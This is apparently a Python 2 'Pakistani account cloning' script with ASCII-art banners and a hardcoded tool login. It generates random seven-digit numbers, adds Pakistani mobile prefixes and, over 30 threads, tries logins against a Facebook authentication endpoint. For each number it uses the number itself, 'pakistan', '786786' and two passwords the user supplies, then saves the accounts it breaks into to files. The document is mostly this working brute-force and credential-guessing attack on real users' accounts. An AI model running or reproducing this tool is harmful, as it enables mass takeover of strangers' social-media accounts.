# CODER # HAUNTERBOY # ALAMIN!/usr/bin/python2
#coding=utf-8 # DON'T TRY TO EDIT MY TOOL
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 pakcracker.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

          \033[1;91m██████╗░░█████╗░██╗░░██╗
          \033[1;91m██╔══██╗██╔══██╗██║░██╔╝
          \033[1;91m██████╔╝███████║█████═╝░
          \033[1;91m██╔═══╝░██╔══██║██╔═██╗░
          \033[1;91m██║░░░░░██║░░██║██║░╚██╗
          \033[1;91m╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝

\033[1;96m░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░
\033[1;96m██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗
\033[1;96m██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██████╔╝
\033[1;96m██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██╔══██╗
\033[1;96m╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██║░░██║
\033[1;96m░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝


\033[1;91m|=========================================================|
\033[1;93m AUTHOR : HAUNTERBOY ALAMIN
\033[1;92m FACEBOOK : MD ALAMIN KHAN
\033[1;94m Contact : https://www.facebook.com/alaminkhan.60

\033[1;92m|=========================================================|

"""

####Logo####

logo1 = """

\033[1;94m░██╗░░░░░░░██╗██╗████████╗██╗░░██╗░█████╗░██╗░░░██╗████████╗
░██║░░██╗░░██║██║╚══██╔══╝██║░░██║██╔══██╗██║░░░██║╚══██╔══╝
░╚██╗████╗██╔╝██║░░░██║░░░███████║██║░░██║██║░░░██║░░░██║░░░
░░████╔═████║░██║░░░██║░░░██╔══██║██║░░██║██║░░░██║░░░██║░░░
░░╚██╔╝░╚██╔╝░██║░░░██║░░░██║░░██║╚█████╔╝╚██████╔╝░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚═════╝░░░░╚═╝░░░

\033[1;93m░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░
██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗
██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██████╔╝
██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██╔══██╗
╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██║░░██║
░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝

\033[1;91m|=========================================================|
\033[1;93m AUTHOR : HAUNTERBOY ALAMIN
\033[1;92m FACEBOOK : MD ALAMIN KHAN
\033[1;94m Contact : https://www.facebook.com/alaminkhan.60

\033[1;92m|=========================================================|
"""
logo2 = """

\033[1;91m██╗░░██╗░█████╗░██╗░░░██╗███╗░░██╗████████╗███████╗██████╗░
██║░░██║██╔══██╗██║░░░██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗
███████║███████║██║░░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝
██╔══██║██╔══██║██║░░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗
██║░░██║██║░░██║╚██████╔╝██║░╚███║░░░██║░░░███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝

\033[1;92m░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░
██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗
██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██████╔╝
██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██╔══██╗
╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██║░░██║
░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
\033[1;91m|=========================================================|
\033[1;93m AUTHOR : HAUNTERBOY ALAMIN
\033[1;92m FACEBOOK : MD ALAMIN KHAN
\033[1;94m Contact : https://www.facebook.com/alaminkhan.60

\033[1;92m|=========================================================|
"""     
CorrectUsername = "HAUNTERBOYALAMIN"
CorrectPassword = "kHAN"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m\x1b[1;93mTool Username \x1b[1;97m➤➤➤\x1b[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;94mTool Password  \x1b[1;97m➤➤➤\x1b[1;93m")
        if (password == CorrectPassword):
            print "Logged in successfully as HAUNTERBOY ALAMIN" #Dev:HAUNTERBOY ALAMIN
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/alaminkhan.60')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/alaminkhan.60')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;92m|=============SELECT ANY  NUMBER==============|"
    time.sleep(0.05)
    print "\033[1;92m[ 1 ]\x1b[1;93mStart Cracking Pakistani Ids"  
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[1;91m Exit ( Back)'
    print'\033[1;92m|============HAUNTERBOY ALAMIN================|'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHO\x1b[1;96mOSE ANY OPTION: \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    print logo2
    print'\033[1;93m|=======================HAUNTERBOY======================|'
    print '\x1b[1;97m[ 1 ] \x1b[1;92mStart Cloning Pakistani Accounts '
    time.sleep(0.10)
    print '\x1b[1;94m[0] back'
    time.sleep(0.10)
    print'\033[1;93m|=======================●\x1b[1;92m ALAMIN ======================|'   
   
    time.sleep(0.05)
    action()
os.system('xdg-open https://www.facebook.com/alaminkhan.60')

def action():
    peak = raw_input('\n\033[1;93mCHOOSE ANY OPTION:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo1
        
        print'\033[1;92m █▀▄ ▄▀▄ █─▄▀ ▀ ▄▀▀ ▀█▀ ▄▀▄ █▄─█'
        print'\033[1;93m █─█ █▀█ █▀▄─ █ ─▀▄ ─█─ █▀█ █─▀█'
        print'\033[1;96m █▀─ ▀─▀ ▀─▀▀ ▀ ▀▀─ ─▀─ ▀─▀ ▀──▀'
        print "\033[1;92mEnter any Pakistani Mobile code Number"+'\n \x1b[1;97m'
        print 'Choose any code'

        print'\033[1;91m======\033[1;97m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m====\033[1;97m=====\033[1;91m=====\033[1;91m=====\033[1;97m====='
        print'\033[1;92mSelect any code from Jazz👇👇' 
        print'\033[1;96m ➤ \033[1;97m 00 , 01 , 02 , 03 , 04 , 05 , 06 , 07 , 08 , 09  '
        print'\033[1;97m====\033[1;91m=====\033[1;97m========\033[1;91m==========\033[1;97m==========\033[1;91m=====\033[1;97m=====\033[1;91m=======\033[1;91m======\033[1;97m=====\033[1;91m======\033[1;97m======\033[1;91m=====\033[1;97m======\033[1;91m======'

        print'\033[1;96mSelect any code from Zong👇👇' 
        print'\033[1;92m ➤  \033[1;95m 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18  '
        print'\033[1;91m======\033[1;97m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m====\033[1;97m=====\033[1;91m=====\033[1;91m=====\033[1;97m====='

        print'\033[1;91mSelect any code from Warid👇👇' 
        print'\033[1;93m ➤\033[1;97m 20 , 21 ,22 ,23 , 24  '
        print'\033[1;97m====\033[1;91m=====\033[1;97m========\033[1;91m==========\033[1;97m==========\033[1;91m=====\033[1;97m=====\033[1;91m=======\033[1;91m======\033[1;97m=====\033[1;91m======\033[1;97m======\033[1;91m=====\033[1;97m======\033[1;91m======'

        print'\033[1;95mSelect any code from Ufone👇👇'
        print'\033[1;95m ➤ \033[1;93m30 , 31 , 32 , 33 , 34 , 35 , 36 , 37  '
        print'\033[1;91m======\033[1;97m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m====\033[1;97m=====\033[1;91m=====\033[1;91m=====\033[1;97m====='

        print'\033[1;96mSelect any code from Telenor👇👇'                    
        print'\033[1;94m ➤ \033[1;92m40 , 41 , 42 , 43 , 44 , 45 , 46 , 47 , 48 , 49  '
        print'\033[1;97m====\033[1;91m=====\033[1;97m========\033[1;91m==========\033[1;97m==========\033[1;91m=====\033[1;97m=====\033[1;91m=======\033[1;91m======\033[1;97m=====\033[1;91m======\033[1;97m======\033[1;91m=====\033[1;97m======\033[1;91m======'
        print'\033[1;94: 💠NOTE💠::: \033[1;96mSELECT ANY CODE FROM THESE COUNTRY CODES AND THEN                                \033[1;95mENTER 2 PASSWORDS OF YOUR OWN. THE PASSWORDS MAY BE ANY WORDS BUT REMEMBER THE WORD NEEDS TO BE MORE THEN 6 DIGITS. IF  THERE ARE ANY PAKISTANI ACCOUNTS OF YOUR ENTERED PASSWORDS YOU WILL GET THAT ACCOUNTS ALSO. SO CONSIDER THIS AS A PLUSPOINT FOR YOU BECAUSE YOU WILL GET ACCOUNTS BY 7-11 DIGIT CRACKING AND ALSO FROM YOUR OWN PASSWORDS.THUS YOU WILL GET IDS MORE'
        print'\033[1;91m======\033[1;97m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m=====\033[1;97m=====\033[1;91m======\033[1;97m=====\033[1;91m====\033[1;97m=====\033[1;91m=====\033[1;91m=====\033[1;97m====='
        try:
            c = raw_input("\033[1;93mCHOOSE ANY CODE: ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] ENTER VALID NUMBER'
        print 47* '\033[1;93m=='
        action()
        print'\033[1;94: 💠NOTE💠::: \033[1;95mENTER 3 PASSWORDS OF YOUR OWN. THE PASSWORDS MAY BE ANY WORDS BUT REMEMBER THE WORD NEEDS TO BE MORE THEN 6 DIGITS. IF  THERE ARE ANY PAKISTANI ACCOUNTS OF YOUR ENTERED PASSWORDS YOU WILL GET THAT ACCOUNTS ALSO. SO CONSIDER THIS AS A PLUSPOINT FOR YOU BECAUSE YOU WILL GET ACCOUNTS BY 7-11 DIGIT CRACKING AND ALSO FROM YOUR OWN PASSWORDS.THUS YOU WILL GET IDS MORE'
    Haunter = raw_input('\x1b[1;92m TYPE ANY PASSWORD NO1: ')
    Haunterr = raw_input('\x1b[1;93m TYPE ANY PASSWORD NO2 : ')
    print 47* '\033[1;92m--'
    xxx = str(len(id))
    jalan ('[❄]\033[1;96m Total Pakistan ids:\x1b[1;93m '+'60000')
    jalan ("[🍁]\033[1;95m password will be crack \x1b[1;93m7 digit\x1b[1;96mAnd Your Given Passwords....")
    jalan ('[🌲]\033[1;91mTotal Password \x1b[1;94m    '+ '60000')
    jalan ('[⚡]\033[1;92mCode you choose\x1b[1;97m: '+c)
    jalan ("[🌀]\033[1;93mWait A While Start\x1b[1;92m Cracking...")
    jalan ("[♻]\033[1;94mTo Stop Process Press\x1b[1;93m Ctrl+z")
    print 47* '\033[1;94m=='
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m7 Digit-SUCCESSFULL \x1b[1;92m )  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass1 + ' \x1b[1;92m[LOG IN NOW]'                                      
                okb = open('save/successfull.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;94m[7 Digit-CHECKPOINT] ' + k + c + user + '\x1b[1;94m >>> \x1b[1;94m ' + pass1 + ' \033[1;96m[LOG IN AFTER 3 DAYS]'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = "pakistan"
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(11 Digit-SUCCESSFULL)  ' + k + c + user +  '\x1b[1;92m >>> \x1b[1;92m' + pass2 + ' \x1b[1;92m[LOG IN NOW]'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;93m[AUTO PASS-CHECKPOINT] ' + k + c + user + '\x1b[1;91m >>>> \x1b[1;93m' + pass2 + ' \033[1;93m[LOG IN AFTER 3 DAYS]'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3= Haunter
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92mOWN PASS-SUCCESS)  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m'+ pass3 + ' \x1b[1;92m[LOG IN NOW]'
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;91m [OWN PASS-CHECKPOINT] ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass3 + ' \033[1;93m[LOG IN AFTER 3 DAYS]'
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4= Haunterr
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[OWN PASS-SUCCESS]  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass4 + ' \x1b[1;92m[LOG IN NOW]'
                                        okb = open('save/successfull.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;93m[OWN PASS-CHECKPOINT] ' + k + c + user + '\x1b[1;93m >>>\x1b[1;93m' + pass4 + ' \033[1;93m[LOG IN AFTER 3 DAYS]'
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5= "786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m[PASS-SUCCESS ]  ' + k + c + user + '\x1b[1;91m >>> \x1b[1;92m' + pass5 + ' \x1b[1;92m[LOG IN NOW]'
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;94m[PASS-CHECKPOINT] ' + k + c + user + '\x1b[1;97m >>> \x1b[1;94m' + pass5 + ' \033[1;91m[LOG IN AFTER 3 DAYS]'
                                                    cps = open('save/checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                          
                                                                                                                                                                                                                    
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                         
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/checkpoint.txt')
    jalan("Note : Your checkpoint account Will Open after 3 to 5 days")
    print ''
    print """
    
\033[1;91m___________________________________________________________$$s________________
_________________________________________$____$$s___________s$$s________________
_________________________________________s$$$$s$$$$$$s________$$$___s$________________
_______________________________s$$$$$$$$s___s$$$$ss$$$$s________$$$__$$________________
________________________s$$$s__$$$$$s_$$$s___s$__s$$s_$$________________________________
__________________________s$$$$$$$$$$$$$$$$$$$$sss$$$$s_$$$s__$$$__s$$s$________________
_____________________s$$$$$$$$$s_____s$$$$$$$$$$$$$$h$$$__$$$s__$$___$$$s________________
___________________s$$$$$s_____________________ss$$$$$$$$s_s$$$s$$$__s$$$________________
__________________________________________s$$$s____s$$$$$$$$s$$$$$$$__$$$________________
_________________________s$$$$$$$$$$$$$$$s$$$$$$$$$$s$$$$$$$$$ss$$$$s_$$$________________
_____________________________________s$$$$$$$$$$s$$$s____s$$$$$$__$$$__$$________________
________________________________s$$$$$$$$$$$$$$$$$$$$$$s_____s$$$s_$$__$$________________
________________________s$$$$$$$$$$$$$$$$$$$$$$$s$s__s$$$$$$s___$$s_$s$$$________________
_____________________s$$$$$s$$$$$$$$$$$$$$s____$$s$$$$$$$$$$$$$s____$$$$s________________
___________________s$$$$__s$$$$$$$$$s_____s$$$$$s$$$$$$$$$$$$$$$$$s__$$$________________
___________________s$___$$$$$$______s$$$$$$$s_s$$$$$$$$$$$$$$$$$$$$$____$$$________________
______________________s$$$s___s$$$$$$$$$$$___$$$$$$$$$$$$$$$$$$$$$$$$s$$$$$$$s________________
_____________________$$$__s$$$$$$$$$$$$$$__$$$$$$$$$$$$$$$$$$$$s$s$_$$$$$$$$$$$________________
____________________$$$_$$$$$$i$$$$$s_$$__$$$$$$$$$$$$$$$$$$$ss$$$s$$$$$$$$s$$s________________
___________________$$__$$$__s$$$$ss__$$_$$$$$$$$$$$$$$$$$$$$s$$$$$_$$$$e$$s$________________
\033[1;92m__________________$$_s$$___$$$$s_$$_$$s$$$$$$$$$$$$$$$$$$$$s$$$$$s_$$$$$$s$________________
_________________s$s$$$___$$$$_s$$__$$__$$$$$$$$$$$$$$$$$$_$$$$$$$_s_$$$________________
_________________$$s$s__s$$$__$$____s$$__$$$$$$$$$$$$$$$$$_$$$$$$$$__$$$________________
________________$$_$___$$$$_s$$__$$__$$$s__s$$$$$$$$$$$$$$_$$$$$$$$$$$$s________________
________________$$____$$$s_$$$__$$$_$_s$$$$s___s$s$$$$$$$$_$$$$$$$$s$$$________________
________________$____$$$__$$sss$$$$__$_s$$$$$$$$$$s$s$$$$$___s$$$$s$$$s________________
____________________$$$_s$$$_$s$$$$s_s$__$$$$$$___s$$s_$$$s___s$$$_$$$________________
____________________$$_s$$$_$$_s$$$$$_s$$___$$$$$________$_____$$$s$$s________________
___________________s$$_$$$__$$__$$$$$$$$$$s____s$$$$$_________s$$$$$$________________
___________________$$$s$$$__$$___$$ss$$$$$$$$s____s$$$$$s______$$$$$$________________
___________________$s$$$$$_s$$__s_$$$_s$$$$$$$$$$s___s$$$$$$$s___sss________________
___________________$$$$$$$_$$$__$s_$$$$s__s$$$$$$$$$s___$$$$$$$s________________
__________________s$$$$$$$_$$$s_s$__$$$$$$s__s$$$$$$$$$s__$__$$$$s________________
__________________$_$$$$s$_s$$$__$$__$$$$$$$$s__$$s$$$$$$$_____$$$$________________
____________________s$$$_$$_$$$___$$__$s$$$$$$$$_s__s$$$s$$$____$$$$________________
_____________________$$$__$_$$$$___$$_ss_$$$$$$$$$____$$$$_s$____$$$s________________
_____________________$$$s_$_s$$$s__$$$____s$$$$$$$$$___s$$$______$$$$________________
_____________________s$$$_ss_$$$$___$$s____$$$$$$$$$$___$$$$_____s$$$________________
______________________$k$__$__$$$$__s$$____$$$$$$$h$$____$$$$_____$$s________________
______________________$$$______$$$s__$$$___$$_$$$$$$$$___s$$$$____$$________________
\033[1;96m_______________________$$s______$$$__s$$$___$_s$$$$$s____s$$$$____$s________________
_______________________$$$_______$$$_s$$_$__$__$$$$$s____s$$$$___$$________________
________________________$$_______s$$__$$_______$$$$$s____$$$$$___$s________________
________________________$$________s$$_$$______s$$$$$_____$$_$$___$________________
___________________________________$$_$$s_____$$$$$_____$$s_$s________________
____________________________________$$s$$_____$$$$_____s$$__$________________
____________________________________s$_$$____$$$s_____s$$________________
_____________________________________$_$$___$$$______s$$________________
_______________________________________$$__s$$______$$$________________
________________________________________$__$$______$$$________________
________________________________________$_$$s____$$$s________________
__________________________________________$$___s$$s________________
__________________________________________$$__$$s________________



\033[1;96mThanks me later
\033[1;92mFb\033[1;93mMD ALAMIN KHAN
\033[1;95mFACEBOOK\033[1;97mhttps://www.facebook.com/alaminkhan.60
"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()



